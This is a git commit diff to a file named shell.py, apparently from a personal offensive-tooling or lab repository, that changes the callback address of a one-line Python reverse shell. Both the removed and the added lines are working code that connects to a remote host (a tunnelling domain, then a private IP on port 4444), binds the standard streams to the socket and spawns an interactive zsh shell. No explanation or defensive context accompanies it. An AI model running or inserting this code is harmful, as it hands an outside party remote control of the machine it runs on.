4ba5a52914b751b68d36d0e69b7b1c4721ac8643
nfdownload <rootdxtrz@gmail.com>
2026-02-17 12:23:36 -0300

    Update connection details in shell.py
    Signed-off-by: nfdownload <rootdxtrz@gmail.com>

--- shell.py
+++ shell.py
@@ -1,1 +1,1 @@
-import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("eepfzaf6j.localto.net",8500));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("zsh")
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.147", 4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("zsh")
